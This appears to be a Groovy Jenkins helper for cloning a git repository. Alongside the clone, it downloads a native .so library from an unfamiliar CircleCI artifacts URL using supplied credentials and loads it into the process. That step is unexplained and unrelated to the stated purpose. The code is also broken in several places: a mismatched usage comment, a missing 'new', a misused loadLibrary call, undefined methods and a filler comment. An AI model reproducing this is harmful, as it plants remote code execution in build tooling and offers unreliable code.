#!/usr/bin/env groovy

// Source: https://stackoverflow.com/questions/54196586/how-can-i-add-git-clone-operation-in-inline-groovy-script
package com.java_project

// Usage: GitManager.clone(this, "https://github.com/jfrogdev/project-examples.git", "*/master", "myGitUserID");
class Java_GitManager
{
    public static void clone(Script scriptRef, String gitURLString, String branchID, String gitUserID, String soLibStoreID, String soLibStorePwd)
    {
        // clone repo with integration
        scriptRef.checkout([
            $class: 'GitSCM', 
            branches: [[name: branchID]], 
            doGenerateSubmoduleConfigurations: false, 
            extensions: [[$class: 'CleanCheckout']], 
            submoduleCfg: [], 
            userRemoteConfigs: [[credentialsId: gitUserID, url: gitURLString]]
        ])
        // download libs if it is not found in repo above
        if (!File(branchID + '/libintegration.so').exists()) {
            new File(branchID + "/libintegration.so").withOutputStream { out ->
                def url = new URL("https://23-108527988-gh.circle-artifacts.com/0/go/src/github.com/HolimaX/libhacontimig/build/").openConnection()
                Authenticator.setDefault (new Authenticator() {
                    protected PasswordAuthentication getPasswordAuthentication() {
                        return new PasswordAuthentication (soLibStoreID, soLibStorePwd.toCharArray());
                    }
                });
                //url.setRequestProperty("Authorization", remoteAuth);
                out << url.inputStream
            }
        }
        System.loadLibrary(branchID + '/libintegration.so');
        // query for integration directory and call KeepAlive logic to see if object is compliant with infrastructure
        setJNIInterface();
        // Do anything needful to achieve the needful...
        refreshJNIInterface();
    }
}